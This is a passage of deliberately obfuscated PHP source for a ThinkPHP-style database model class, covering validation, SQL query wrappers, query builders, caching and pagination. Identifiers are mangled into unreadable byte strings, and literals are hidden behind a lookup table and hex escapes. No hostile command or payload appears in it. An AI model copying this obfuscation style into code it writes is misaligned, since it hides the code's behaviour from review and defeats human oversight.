$­‡äù®’) { if (!1 === $this->_validationFieldItem($’ÎÇÇÏÑ, $­‡äù®’)) { if ($this->patchValidate) { $this->error[$­‡äù®’[0]] = $­‡äù®’[2]; } else { $this->error = $­‡äù®’[2]; return !1; } } return; } protected function _validationFieldItem($íÃÍüˆÙ, $€ƒô…ôó) { $—â²Ù† =& $_SERVER[ïÃ°£«Ê]; switch (strtolower(trim($€ƒô…ôó[4]))) { case $—â²Ù†[396]: case $—â²Ù†[397]: $ÃÃ‹…ÛŒ = isset($€ƒô…ôó[6]) ? (array) $€ƒô…ôó[6] : array(); if (is_string($€ƒô…ôó[0]) && strpos($€ƒô…ôó[0], $—â²Ù†[50])) { $€ƒô…ôó[0] = explode($—â²Ù†[50], $€ƒô…ôó[0]); } if (is_array($€ƒô…ôó[0])) { foreach ($€ƒô…ôó[0] as $›Æ“×÷«) { $êó¤£»­[$›Æ“×÷«] = $íÃÍüˆÙ[$›Æ“×÷«]; } array_unshift($ÃÃ‹…ÛŒ, $êó¤£»­); } else { array_unshift($ÃÃ‹…ÛŒ, $íÃÍüˆÙ[$€ƒô…ôó[0]]); } if ($—â²Ù†[396] == $€ƒô…ôó[4]) { return call_user_func_array($€ƒô…ôó[1], $ÃÃ‹…ÛŒ); } else { return call_user_func_array(array(&$this, $€ƒô…ôó[1]), $ÃÃ‹…ÛŒ); } case $—â²Ù†[404]: return $íÃÍüˆÙ[$€ƒô…ôó[0]] == $íÃÍüˆÙ[$€ƒô…ôó[1]]; case $—â²Ù†[405]: if (is_string($€ƒô…ôó[0]) && strpos($€ƒô…ôó[0], $—â²Ù†[50])) { $€ƒô…ôó[0] = explode($—â²Ù†[50], $€ƒô…ôó[0]); } $³íÛ‚âå = array(); if (is_array($€ƒô…ôó[0])) { foreach ($€ƒô…ôó[0] as $›Æ“×÷«) { $³íÛ‚âå[$›Æ“×÷«] = $íÃÍüˆÙ[$›Æ“×÷«]; } } else { $³íÛ‚âå[$€ƒô…ôó[0]] = $íÃÍüˆÙ[$€ƒô…ôó[0]]; } if (!empty($íÃÍüˆÙ[$this->getPk()])) { $³íÛ‚âå[$this->getPk()] = array($—â²Ù†[406], $íÃÍüˆÙ[$this->getPk()]); } if ($this->where($³íÛ‚âå)->find()) { return !1; } return !0; default: return $this->check($íÃÍüˆÙ[$€ƒô…ôó[0]], $€ƒô…ôó[1], $€ƒô…ôó[4]); } } public function check($ıßÀÍı„, $ëµŒš¶, $Ëœõ¬¤Ô = "\x72\x65\147\x65\170") { $ú¶÷àÉ² =& $_SERVER[ïÃ°£«Ê]; $Ëœõ¬¤Ô = strtolower(trim($Ëœõ¬¤Ô)); switch ($Ëœõ¬¤Ô) { case $ú¶÷àÉ²[7]: case $ú¶÷àÉ²[407]: $£¡–‘ê = is_array($ëµŒš¶) ? $ëµŒš¶ : explode($ú¶÷àÉ²[50], $ëµŒš¶); return $Ëœõ¬¤Ô == $ú¶÷àÉ²[7] ? in_array($ıßÀÍı„, $£¡–‘ê) : !in_array($ıßÀÍı„, $£¡–‘ê); case $ú¶÷àÉ²[408]: case $ú¶÷àÉ²[409]: if (is_array($ëµŒš¶)) { $ğ“´›Ã× = $ëµŒš¶[0]; $áö¬â­ = $ëµŒš¶[1]; } else { list($ğ“´›Ã×, $áö¬â­) = explode($ú¶÷àÉ²[50], $ëµŒš¶); } return $Ëœõ¬¤Ô == $ú¶÷àÉ²[408] ? $ıßÀÍı„ >= $ğ“´›Ã× && $ıßÀÍı„ <= $áö¬â­ : $ıßÀÍı„ < $ğ“´›Ã× || $ıßÀÍı„ > $áö¬â­; case $ú¶÷àÉ²[410]: case $ú¶÷àÉ²[411]: return $Ëœõ¬¤Ô == $ú¶÷àÉ²[410] ? $ıßÀÍı„ == $ëµŒš¶ : $ıßÀÍı„ != $ëµŒš¶; case $ú¶÷àÉ²[412]: $ƒ‹°ö² = mb_strlen($ıßÀÍı„, $ú¶÷àÉ²[413]); if (strpos($ëµŒš¶, $ú¶÷àÉ²[50])) { list($ğ“´›Ã×, $áö¬â­) = explode($ú¶÷àÉ²[50], $ëµŒš¶); return $ƒ‹°ö² >= $ğ“´›Ã× && $ƒ‹°ö² <= $áö¬â­; } else { return $ƒ‹°ö² == $ëµŒš¶; } case $ú¶÷àÉ²[414]: list($¦ŞÅÁ®‹, $ñÀ—„Âš) = explode($ú¶÷àÉ²[50], $ëµŒš¶); if (!is_numeric($¦ŞÅÁ®‹)) { $¦ŞÅÁ®‹ = strtotime($¦ŞÅÁ®‹); } if (!is_numeric($ñÀ—„Âš)) { $ñÀ—„Âš = strtotime($ñÀ—„Âš); } return NOW_TIME >= $¦ŞÅÁ®‹ && NOW_TIME <= $ñÀ—„Âš; case $ú¶÷àÉ²[415]: return in_array(get_client_ip(), explode($ú¶÷àÉ²[50], $ëµŒš¶)); case $ú¶÷àÉ²[416]: return !in_array(get_client_ip(), explode($ú¶÷àÉ²[50], $ëµŒš¶)); case $ú¶÷àÉ²[403]: default: return $this->regex($ıßÀÍı„, $ëµŒš¶); } } public function query($ ‰¬‹¦, $€ê­§ôË = false) { $İ÷³ó¥Ü =& $_SERVER[ïÃ°£«Ê]; if (!is_bool($€ê­§ôË) && !is_array($€ê­§ôË)) { $€ê­§ôË = func_get_args(); array_shift($€ê­§ôË); } $ ‰¬‹¦ = str_replace(array($İ÷³ó¥Ü[285], $İ÷³ó¥Ü[417]), $İ÷³ó¥Ü[53], $ ‰¬‹¦); $ ‰¬‹¦ = $this->parseSql($ ‰¬‹¦, $€ê­§ôË); return $this->db->query($ ‰¬‹¦); } public function execute($º™œğ¿¸, $¯ï€×‰¤ = false) { if (!is_bool($¯ï€×‰¤) && !is_array($¯ï€×‰¤)) { $¯ï€×‰¤ = func_get_args(); array_shift($¯ï€×‰¤); } $º™œğ¿¸ = $this->parseSql($º™œğ¿¸, $¯ï€×‰¤); return $this->db->execute($º™œğ¿¸); } protected function parseSql($¾İüÛëä, $¡Ë•ë¦¦) { $É¡éÛÜ– =& $_SERVER[ïÃ°£«Ê]; if (!0 === $¡Ë•ë¦¦) { $æëè«¬ = $this->_parseOptions(); $¾İüÛëä = $this->db->parseSql($¾İüÛëä, $æëè«¬); } elseif (is_array($¡Ë•ë¦¦)) { $¡Ë•ë¦¦ = array_map(array($this->db, $É¡éÛÜ–[418]), $¡Ë•ë¦¦); $¾İüÛëä = vsprintf($¾İüÛëä, $¡Ë•ë¦¦); } else { $¾İüÛëä = strtr($¾İüÛëä, array($É¡éÛÜ–[419] => $this->getTableName(), $É¡éÛÜ–[420] => think_config($É¡éÛÜ–[321]))); } $this->db->setModel($this->name); return $¾İüÛëä; } public function db($ƒÁİ¿ä¼ = '', $‰®£Ñ—® = '', $ö´šÉòÅ = array()) { $Ş±ëÃÉ =& $_SERVER[ïÃ°£«Ê]; if ($Ş±ëÃÉ[12] === $ƒÁİ¿ä¼ && $this->db) { return $this->db; } static $ãÖàò¤¹ = array(); static $¼ÖÙ­å = array(); if (!isset($¼ÖÙ­å[$ƒÁİ¿ä¼]) || isset($¼ÖÙ­å[$ƒÁİ¿ä¼]) && $‰®£Ñ—® && $ãÖàò¤¹[$ƒÁİ¿ä¼] != $‰®£Ñ—®) { if (!empty($‰®£Ñ—®) && is_string($‰®£Ñ—®) && !1 === strpos($‰®£Ñ—®, $Ş±ëÃÉ[8])) { $‰®£Ñ—® = think_config($‰®£Ñ—®); } $ƒÁİ¿ä¼ = think_guid($‰®£Ñ—®); $¼ÖÙ­å[$ƒÁİ¿ä¼] = Db::getInstance($‰®£Ñ—®); } elseif (NULL === $‰®£Ñ—®) { $¼ÖÙ­å[$ƒÁİ¿ä¼]->close(); unset($¼ÖÙ­å[$ƒÁİ¿ä¼]); return; } if (!empty($ö´šÉòÅ)) { if (is_string($ö´šÉòÅ)) { parse_str($ö´šÉòÅ, $ö´šÉòÅ); } foreach ($ö´šÉòÅ as $¦‘ÀÈ³Ê => $´£Òî¼) { $this->setProperty($¦‘ÀÈ³Ê, $´£Òî¼); } } $ãÖàò¤¹[$ƒÁİ¿ä¼] = $‰®£Ñ—®; $this->db = $¼ÖÙ­å[$ƒÁİ¿ä¼]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $«ÑÌ„Å® = get_class($this); if ($«ÑÌ„Å® == $_SERVER[ïÃ°£«Ê][421]) { return $this->name; } $this->name = substr($«ÑÌ„Å®, 0, -5); } return $this->name; } public function getTableName() { $‘£¥œÖŞ =& $_SERVER[ïÃ°£«Ê]; if (empty($this->trueTableName)) { $ô‡Í² = !empty($this->tablePrefix) ? $this->tablePrefix : $‘£¥œÖŞ[12]; if (!empty($this->tableName)) { $ô‡Í² .= $this->tableName; } else { $ô‡Í² .= think_parse_name($this->name); } $this->trueTableName = strtolower($ô‡Í²); } return (!empty($this->dbName) ? $this->dbName . $‘£¥œÖŞ[10] : $‘£¥œÖŞ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $òµèØŞ =& $_SERVER[ïÃ°£«Ê]; return isset($this->fields[$òµèØŞ[328]]) ? $this->fields[$òµèØŞ[328]] : $this->pk; } public function getDbFields() { $ ­òŠí± =& $_SERVER[ïÃ°£«Ê]; if (isset($this->options[$ ­òŠí±[357]])) { $ËÖ¤­Ñ¡ = $this->db->getFields($this->options[$ ­òŠí±[357]]); return $ËÖ¤­Ñ¡ ? array_keys($ËÖ¤­Ñ¡) : !1; } if ($this->fields) { $ËÖ¤­Ñ¡ = $this->fields; unset($ËÖ¤­Ñ¡[$ ­òŠí±[327]], $ËÖ¤­Ñ¡[$ ­òŠí±[328]], $ËÖ¤­Ñ¡[$ ­òŠí±[329]], $ËÖ¤­Ñ¡[$ ­òŠí±[326]]); return $ËÖ¤­Ñ¡; } return !1; } public function data($Ö˜Ø•¤ = '') { $ĞÙÖö¦ï =& $_SERVER[ïÃ°£«Ê]; if ($ĞÙÖö¦ï[12] === $Ö˜Ø•¤ && !empty($this->data)) { return $this->data; } if (is_object($Ö˜Ø•¤)) { $Ö˜Ø•¤ = get_object_vars($Ö˜Ø•¤); } elseif (is_string($Ö˜Ø•¤)) { parse_str($Ö˜Ø•¤, $Ö˜Ø•¤); } elseif (!is_array($Ö˜Ø•¤)) { think_exception(think_lang($ĞÙÖö¦ï[349])); } $this->data = $Ö˜Ø•¤; return $this; } public function join($ë‰Ä´İ±) { $ö‹êÒı´ =& $_SERVER[ïÃ°£«Ê]; if (is_array($ë‰Ä´İ±)) { $this->options[$ö‹êÒı´[360]] = $ë‰Ä´İ±; } elseif (!empty($ë‰Ä´İ±)) { $this->options[$ö‹êÒı´[360]][] = $ë‰Ä´İ±; } return $this; } public function union($ÑµòßÅ‡, $ü˜ñ±Š™ = false) { $ûó¿–û¢ =& $_SERVER[ïÃ°£«Ê]; if (empty($ÑµòßÅ‡)) { return $this; } if ($ü˜ñ±Š™) { $this->options[$ûó¿–û¢[422]][$ûó¿–û¢[423]] = !0; } if (is_object($ÑµòßÅ‡)) { $ÑµòßÅ‡ = get_object_vars($ÑµòßÅ‡); } if (is_string($ÑµòßÅ‡)) { $«Ñ‰–ÄÅ = $ÑµòßÅ‡; } elseif (is_array($ÑµòßÅ‡)) { if (isset($ÑµòßÅ‡[0])) { $this->options[$ûó¿–û¢[422]] = array_merge($this->options[$ûó¿–û¢[422]], $ÑµòßÅ‡); return $this; } else { $«Ñ‰–ÄÅ = $ÑµòßÅ‡; } } else { think_exception(think_lang($ûó¿–û¢[349])); } $this->options[$ûó¿–û¢[422]][] = $«Ñ‰–ÄÅ; return $this; } public function cache($Ûä†òşÖ = true, $ë¾¼á–­ = null, $·…©úøû = '') { $”·’¸ıì =& $_SERVER[ïÃ°£«Ê]; if (!1 !== $Ûä†òşÖ) { $this->options[$”·’¸ıì[424]] = array($”·’¸ıì[95] => $Ûä†òşÖ, $”·’¸ıì[414] => $ë¾¼á–­, $”·’¸ıì[33] => $·…©úøû); } return $this; } public function field($»à¸ÓÎ×, $öÕÑÓ÷ = false) { $ïğô²èä =& $_SERVER[ïÃ°£«Ê]; if (!0 === $»à¸ÓÎ×) { $ÍÂ‚œÇ = $this->getDbFields(); $»à¸ÓÎ× = $ÍÂ‚œÇ ? $ÍÂ‚œÇ : $ïğô²èä[220]; } elseif ($öÕÑÓ÷) { if (is_string($»à¸ÓÎ×)) { $»à¸ÓÎ× = explode($ïğô²èä[50], $»à¸ÓÎ×); } $ÍÂ‚œÇ = $this->getDbFields(); $»à¸ÓÎ× = $ÍÂ‚œÇ ? array_diff($ÍÂ‚œÇ, $»à¸ÓÎ×) : $»à¸ÓÎ×; } $this->options[$ïğô²èä[351]] = $»à¸ÓÎ×; return $this; } public function scope($ŞùëâÍ = '', $ÀÌ“Àì¦ = NULL) { $ÖËÖÑà =& $_SERVER[ïÃ°£«Ê]; if ($ÖËÖÑà[12] === $ŞùëâÍ) { if (isset($this->_scope[$ÖËÖÑà[37]])) { $ƒ¼úµéö = $this->_scope[$ÖËÖÑà[37]]; } else { return $this; } } elseif (is_string($ŞùëâÍ)) { $¶Ö³ô = explode($ÖËÖÑà[50], $ŞùëâÍ); $ƒ¼úµéö = array(); foreach ($¶Ö³ô as $ÀÌ±‡úó) { if (!isset($this->_scope[$ÀÌ±‡úó])) { continue; } $ƒ¼úµéö = array_merge($ƒ¼úµéö, $this->_scope[$ÀÌ±‡úó]); } if (!empty($ÀÌ“Àì¦) && is_array($ÀÌ“Àì¦)) { $ƒ¼úµéö = array_merge($ƒ¼úµéö, $ÀÌ“Àì¦); } } elseif (is_array($ŞùëâÍ)) { $ƒ¼úµéö = $ŞùëâÍ; } if (is_array($ƒ¼úµéö) && !empty($ƒ¼úµéö)) { $this->options = array_merge($this->options, array_change_key_case($ƒ¼úµéö)); } return $this; } public function where($Ìç¾·µ›, $ÈÜ‘ı­ = null) { $›ôØ“ó  =& $_SERVER[ïÃ°£«Ê]; if (!is_null($ÈÜ‘ı­) && is_string($Ìç¾·µ›)) { if (!is_array($ÈÜ‘ı­)) { $ÈÜ‘ı­ = func_get_args(); array_shift($ÈÜ‘ı­); } $ÈÜ‘ı­ = array_map(array($this->db, $›ôØ“ó [418]), $ÈÜ‘ı­); $Ìç¾·µ› = vsprintf($Ìç¾·µ›, $ÈÜ‘ı­); } elseif (is_object($Ìç¾·µ›)) { $Ìç¾·µ› = get_object_vars($Ìç¾·µ›); } elseif (is_array($Ìç¾·µ›)) { foreach ($Ìç¾·µ› as $ä“·¿Ê´ => $”†üäÈ) { if ((is_numeric($ä“·¿Ê´) || !$ä“·¿Ê´) && is_string($”†üäÈ)) { if (strpos($”†üäÈ, $›ôØ“ó [425]) === 0) { continue; } think_trace($›ôØ“ó [426], $›ôØ“ó [12], $›ôØ“ó [49]); die; } } } if (is_string($Ìç¾·µ›) && $›ôØ“ó [12] != $Ìç¾·µ›) { $÷¿¾æËË = array(); $÷¿¾æËË[$›ôØ“ó [427]] = $Ìç¾·µ›; $Ìç¾·µ› = $÷¿¾æËË; } if (isset($this->options[$›ôØ“ó [353]])) { $this->options[$›ôØ“ó [353]] = array_merge($this->options[$›ôØ“ó [353]], $Ìç¾·µ›); } else { $this->options[$›ôØ“ó [353]] = $Ìç¾·µ›; } return $this; } public function limit($½ğÛ¢Ğ, $ÃŸêÀ•– = null) { $âïı¡­ =& $_SERVER[ïÃ°£«Ê]; $this->options[$âïı¡­[368]] = is_null($ÃŸêÀ•–) ? $½ğÛ¢Ğ : $½ğÛ¢Ğ . $âïı¡­[50] . $ÃŸêÀ•–; return $this; } public function page($½Ä¯ñİ, $ìûä´ØÀ = null) { $ÂüìÃÛó =& $_SERVER[ïÃ°£«Ê]; $this->options[$ÂüìÃÛó[428]] = is_null($ìûä´ØÀ) ? $½Ä¯ñİ : $½Ä¯ñİ . $ÂüìÃÛó[50] . $ìûä´ØÀ; return $this; } public function comment($¤íæ®„£) { $this->options[$_SERVER[ïÃ°£«Ê][429]] = $¤íæ®„£; return $this; } public function setProperty($Şé‹ Ø…, $ÙÑÇæÜç) { if (property_exists($this, $Şé‹ Ø…)) { $this->{$Şé‹ Ø…} = $ÙÑÇæÜç; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\x54\151\155\145", "\x74\151\x6d\x65", "\151\156\x73\x65\162\164\54\x75\160\x64\x61\x74\145", "\146\x75\156\x63\164\x69\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\163\145\x72\164", "\146\x75\156\143\164\151\x6f\x6e")); public function setDataAuto($öÒß³™£) { $this->dataAuto = $öÒß³™£; } public function __construct($›ÇÔìÁû = '', $«¯ïİ¸§ = '', $¨‹¾Äğ = '') { parent::__construct($›ÇÔìÁû, $«¯ïİ¸§, $¨‹¾Äğ); } protected $tableMeta = array(); protected function _beforeInsert(&$¼ç©¢Ÿİ, $¡«§Ğ¦) { $Ä­éÓµ =& $_SERVER[ïÃ°£«Ê]; if (!$this->checkDataAutoHas($Ä­éÓµ[430])) { return; } $this->dataBeforeFilter($¼ç©¢Ÿİ, $Ä­éÓµ[430]); } protected function _beforeUpdate(&$©øã²Îï, $»•Åàõ) { $øıÌÌ¹ö =& $_SERVER[ïÃ°£«Ê]; if (!$this->checkDataAutoHas($øıÌÌ¹ö[431])) { return; } $this->dataBeforeFilter($©øã²Îï, $øıÌÌ¹ö[431]); } protected function _afterSelect(&$ÇİÈ¢Ç, $ÓìïÅ‘”) { if (!is_array($ÇİÈ¢Ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[ïÃ°£«Ê][432])) { return; } foreach ($ÇİÈ¢Ç as &$ê£šªâ) { $this->dataAfterFilter($ê£šªâ); } unset($ê£šªâ); } protected function _afterFind(&$üö¬™Íç, $Ì»Ä ’÷) { if (!is_array($üö¬™Íç)) { return; } if (!$this->checkDataAutoHas($_SERVER[ïÃ°£«Ê][432])) { return; } $this->dataAfterFilter($üö¬™Íç); } public static function textEncode($óÅª¼ôÄ) { if (!$óÅª¼ôÄ) { return $óÅª¼ôÄ; } $®ÖÙ¹ = json_encode($óÅª¼ôÄ); $®ÖÙ¹ = preg_replace_callback($_SERVER[ïÃ°£«Ê][433], function ($õ´Òêäğ) { return addslashes($õ´Òêäğ[0]); }, $®ÖÙ¹); return json_decode($®ÖÙ¹); } public static function textDecode($æş¹áºû) { $æ”îäƒ =& $_SERVER[ïÃ°£«Ê]; if (!$æş¹áºû) { return $æş¹áºû; } $õ„ ÷òÇ = json_encode($æş¹áºû); $õ„ ÷òÇ = preg_replace_callback($æ”îäƒ[434], function ($é„‰‘ìˆ) { return $_SERVER[ïÃ°£«Ê][97]; }, $õ„ ÷òÇ); return json_decode($õ„ ÷òÇ); } public function setAutoIncrement($ªøşÛÄÃ) { $Õš”Ø©Œ = array($this->getPk() => $ªøşÛÄÃ); $‹ÕÁ¸¨­ = $this->data($Õš”Ø©Œ)->add(); if ($‹ÕÁ¸¨­) { $this->delete($‹ÕÁ¸¨­); } } public function getAutoIncrement() { $©ÛÑÀ£ = $this->getTableName(); $ÍàÚ¾– = $this->max($this->getPk()); $İêÚ—½Á = $this->query("\x73\x68\x6f\167\x20\x74\141\142\154\x65\x20\x73\x74\141\164\165\x73\40\167\150\x65\x72\145\x20\x4e\141\x6d\145\x3d\x27{$©ÛÑÀ£}\x27"); $ËïõÔ¹Í = $İêÚ—½Á[0][$_SERVER[ïÃ°£«Ê][435]]; $ùÏ­ˆé = max($ÍàÚ¾–, $ËïõÔ¹Í); return $ùÏ­ˆé; } protected function _callBefore($£ÚÓµß“, $½óíçıû) { return $this->cacheCallCheck($£ÚÓµß“, $½óíçıû, !1); } protected function _callAfter($Ä¦…ŠÉ, $û¬íìĞ÷) { return $this->cacheCallCheck($Ä¦…ŠÉ, $û¬íìĞ÷, !0); } protected function cacheFunctionAlias($â€ÆÊ¯ã) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ë¢³ÁşÔ, $ìøè›ÖÆ, $ÕÅ™¿ıø = false) { $¥ĞÀñ£ =& $_SERVER[ïÃ°£«Ê]; $İÃü±Ö = $this->cacheFunctionAlias($ìøè›ÖÆ); if (!$İÃü±Ö) { return; } foreach ($İÃü±Ö as $¤ÇÔŸ•­ => $È¤ß¬Î¢) { $ËÊ»»Ä· = $È¤ß¬Î¢[0]; $Ç¡Š½×Õ = explode($¥ĞÀñ£[50], $È¤ß¬Î¢[1]); $§ ‘âõ± = isset($È¤ß¬Î¢[2]) ? $È¤ß¬Î¢[2] : $¥ĞÀñ£[12]; if ($Ë¢³ÁşÔ == $¤ÇÔŸ•­) { return $this->cacheFunctionGet($¤ÇÔŸ•­, $ËÊ»»Ä·, $§ ‘âõ±); } if ($ÕÅ™¿ıø && in_array($Ë¢³ÁşÔ, $Ç¡Š½×Õ)) { $this->cacheFunctionClear($¤ÇÔŸ•­, $ËÊ»»Ä·, $§ ‘âõ±); } } } public function cacheFunctionGet($ÒÉàîß, $Úóüì, $§Î‰ÈØ = '') { $·œ¹·Æ =& $_SERVER[ïÃ°£«Ê]; $´‚ë°ç¯ = $this->cacheKeyMake($ÒÉàîß, $Úóüì, $§Î‰ÈØ); $ÒÚÈã—Ç = Cache::get($´‚ë°ç¯); if (!is_array($ÒÚÈã—Ç)) { if (method_exists($this, $·œ¹·Æ[341] . $ÒÉàîß)) { $ÒÉàîß = $·œ¹·Æ[341] . $ÒÉàîß; } $ÒÚÈã—Ç = call_user_func_array(array($this, $ÒÉàîß), array($Úóüì, !0)); Cache::set($´‚ë°ç¯, $ÒÚÈã—Ç); } return $ÒÚÈã—Ç; } public function cacheFunctionClear($¾í¾§µ, $€ ñÏúŸ, $×í‘‚Á¹ = '') { $¸¨Ì±¶Û = $€ ñÏúŸ; if (!is_array($€ ñÏúŸ)) { $¸¨Ì±¶Û = array($€ ñÏúŸ); } foreach ($¸¨Ì±¶Û as $Ö‰õ”…İ) { $ÔëÍØ—¼ = $this->cacheKeyMake($¾í¾§µ, $Ö‰õ”…İ, $×í‘‚Á¹); Cache::remove($ÔëÍØ—¼); } } public function cacheKeyMake($âèâè÷‹, $á¦ô›é…, $ğİ™Ê×Í) { $‡Ğ·ÊÃÀ =& $_SERVER[ïÃ°£«Ê]; if ($ğİ™Ê×Í) { $á¦ô›é… = $á¦ô›é… . $‡Ğ·ÊÃÀ[436] . $ğİ™Ê×Í; } return get_class($this) . $‡Ğ·ÊÃÀ[11] . $âèâè÷‹ . $‡Ğ·ÊÃÀ[437] . $á¦ô›é…; } protected function selectPageReset() { $‰¢Í€äì =& $_SERVER[ïÃ°£«Ê]; if (isset($GLOBALS[$‰¢Í€äì[438]])) { return; } $GLOBALS[$‰¢Í€äì[438]] = isset($GLOBALS[$‰¢Í€äì[7]][$‰¢Í€äì[439]]) ? $GLOBALS[$‰¢Í€äì[7]][$‰¢Í€äì[439]] : !1; $GLOBALS[$‰¢Í€äì[440]] = isset($GLOBALS[$‰¢Í€äì[7]][$‰¢Í€äì[428]]) ? $GLOBALS[$‰¢Í€äì[7]][$‰¢Í€äì[428]] : !1; $GLOBALS[$‰¢Í€äì[7]][$‰¢Í€äì[439]] = !1; $GLOBALS[$‰¢Í€äì[7]][$‰¢Í€äì[428]] = !1; } protected function selectPageRestore() { $¯¶ö¶Œ¹ =& $_SERVER[ïÃ°£«Ê]; if (!isset($GLOBALS[$¯¶ö¶Œ¹[438]])) { return; } $GLOBALS[$¯¶ö¶Œ¹[7]][$¯¶ö¶Œ¹[439]] = $GLOBALS[$¯¶ö¶Œ¹[438]]; $GLOBALS[$¯¶ö¶Œ¹[7]][$¯¶ö¶Œ¹[428]] = $GLOBALS[$¯¶ö¶Œ¹[440]]; if ($GLOBALS[$¯¶ö¶Œ¹[7]][$¯¶ö¶Œ¹[439]] === !1) { unset($GLOBALS[$¯¶ö¶Œ¹[7]][$¯¶ö¶Œ¹[439]]); } if ($GLOBALS[$¯¶ö¶Œ¹[7]][$¯¶ö¶Œ¹[428]] === !1) { unset($GLOBALS[$¯¶ö¶Œ¹[7]][$¯¶ö¶Œ¹[428]]); } unset($GLOBALS[$¯¶ö¶Œ¹[438]]); unset($GLOBALS[$¯¶ö¶Œ¹[440]]); } protected function selectPage($º›ŞÕá = 200, $î˜ëÃ±‰ = 1) { $–ä£—Í× =& $_SERVER[ïÃ°£«Ê]; global $in; $åúø…¯ = $this->optionsValue(); $­ï•ÀØï = 100000; $º›ŞÕá = isset($in[$–ä£—Í×[439]]) && $in[$–ä£—Í×[439]] ? $in[$–ä£—Í×[439]] : $º›ŞÕá; if ($º›ŞÕá === -1) { $in[$–ä£—Í×[439]] = !1; $­ï•ÀØï = 100000000; $º›ŞÕá = $­ï•ÀØï; } $í‚í™Ì« = $åúø…¯; $í‚í™Ì«[$–ä£—Í×[441]] = array(); $º›ŞÕá = intval($º›ŞÕá); $º›ŞÕá = $º›ŞÕá <= 5 ? 5 : ($º›ŞÕá >= $­ï•ÀØï ? $­ï•ÀØï : $º›ŞÕá); $î˜ëÃ±‰ = intval(isset($in[$–ä£—Í×[428]]) && $in[$–ä£—Í×[428]] ? $in[$–ä£—Í×[428]] : $î˜ëÃ±‰); $î˜ëÃ±‰ = $î˜ëÃ±‰ <= 1 ? 1 : $î˜ëÃ±‰; $Ôİô…Ş = array(); $ìÙÊÄƒŞ = 1; $ƒÜÚ¥Š = $this->selectPageCountBy(); if ($î˜ëÃ±‰ == 1 && $ìÙÊÄƒŞ) { $this->optionsValue($åúø…¯); $Ôİô…Ş = $this->page($î˜ëÃ±‰, $º›ŞÕá)->select(); $‰ÔËş¾ = is_array($Ôİô…Ş) ? count($Ôİô…Ş) : 0; if ($‰ÔËş¾ < $º›ŞÕá) { $ìòø‹Ôœ = 1; } else { $this->optionsValue($í‚í™Ì«); $‰ÔËş¾ = intval($this->count($ƒÜÚ¥Š)); $ìòø‹Ôœ = ceil($‰ÔËş¾ / $º›ŞÕá); } } else { $this->optionsValue($í‚í™Ì«); $‰ÔËş¾ = intval($this->count($ƒÜÚ¥Š)); $ìòø‹Ôœ = ceil($‰ÔËş¾ / $º›ŞÕá); $î˜ëÃ±‰ = $î˜ëÃ±‰ >= $ìòø‹Ôœ ? $ìòø‹Ôœ : $î˜ëÃ±‰; $this->optionsValue($åúø…¯); $Ôİô…Ş = $this->page($î˜ëÃ±‰, $º›ŞÕá)->select(); } $this->selectPageCountBy($–ä£—Í×[442]); if (!is_array($Ôİô…Ş)) { $Ôİô…Ş = array(); } if ($ìòø‹Ôœ == 1) { $‰ÔËş¾ = count($Ôİô…Ş); } $ÑË¿ºË¨ = array($–ä£—Í×[443] => array($–ä£—Í×[444] => $‰ÔËş¾, $–ä£—Í×[439] => $º›ŞÕá, $–ä£—Í×[428] => $î˜ëÃ±‰, $–ä£—Í×[445] => $ìòø‹Ôœ), $–ä£—Í×[446] => $Ôİô…Ş); return $ÑË¿ºË¨; } protected function selectPageCountBy($Ø·Ûö = false) { static $ïÅËŸ÷Ç = null; if (!$Ø·Ûö) { return $ïÅËŸ÷Ç; } if ($Ø·Ûö == $_SERVER[ïÃ°£«Ê][442]) { $ïÅËŸ÷Ç = null; return; } $ïÅËŸ÷Ç = $Ø·Ûö; } protected function checkLength($¿øÇ¸¾Ñ, $é´®´°ğ = 0, $¹Ğ˜Ø¶± = '') { $Á±ŒğáÚ =& $_SERVER[ïÃ°£«Ê]; $é´®´°ğ = $é´®´°ğ ? $é´®´°ğ : 65536; if (!$¿øÇ¸¾Ñ || strlen($¿øÇ¸¾Ñ) < $é´®´°ğ) { return; } $¹Ğ˜Ø¶± = $¹Ğ˜Ø¶± ? $¹Ğ˜Ø¶± . $Á±ŒğáÚ[74] : $Á±ŒğáÚ[12]; show_json($¹Ğ˜Ø¶± . LNG($Á±ŒğáÚ[447]) . "\x28{$é´®´°ğ}\51", !1); } protected function metaSet($˜èî‰¤ü, $ÆşÍÕ = null, $º×á±¾Ã = null) { $Õëµ«· =& $_SERVER[ïÃ°£«Ê]; if (!$this->tableMeta || !$˜èî‰¤ü) { return !1; } $µŒŠ‰’™ = $this->tableMeta[$Õëµ«·[448]]; $ğØğöĞÖ = $this->tableMeta[$Õëµ«·[449]]; $´Òšè£İ = Model($ğØğöĞÖ); $ˆŒ’ÃÜ = array($µŒŠ‰’™ => $˜èî‰¤ü, $Õëµ«·[450] => $ÆşÍÕ); if (is_null($ÆşÍÕ)) { return $´Òšè£İ->where(array($µŒŠ‰’™ => $˜èî‰¤ü))->delete(); } if (is_null($º×á±¾Ã) && is_string($ÆşÍÕ)) { return $´Òšè£İ->where($ˆŒ’ÃÜ)->delete(); } $‘ÂËì« = is_array($ÆşÍÕ) ? $ÆşÍÕ : array(); if (is_string($ÆşÍÕ)) { $‘ÂËì«[$ÆşÍÕ] = $º×á±¾Ã; } $îÁ› = array(); foreach ($‘ÂËì« as $¡ûµ‰Œò => $¢Ï™ˆÖ¡) { if (is_null($¢Ï™ˆÖ¡) && is_string($¡ûµ‰Œò)) { $´Òšè£İ->where(array($µŒŠ‰’™ => $˜èî‰¤ü, $Õëµ«·[450] => $¡ûµ‰Œò))->delete(); continue; } $this->checkLength($¢Ï™ˆÖ¡, !1, $ğØğöĞÖ . $Õëµ«·[4] . $¡ûµ‰Œò); $îÁ›[] = array($µŒŠ‰’™ => 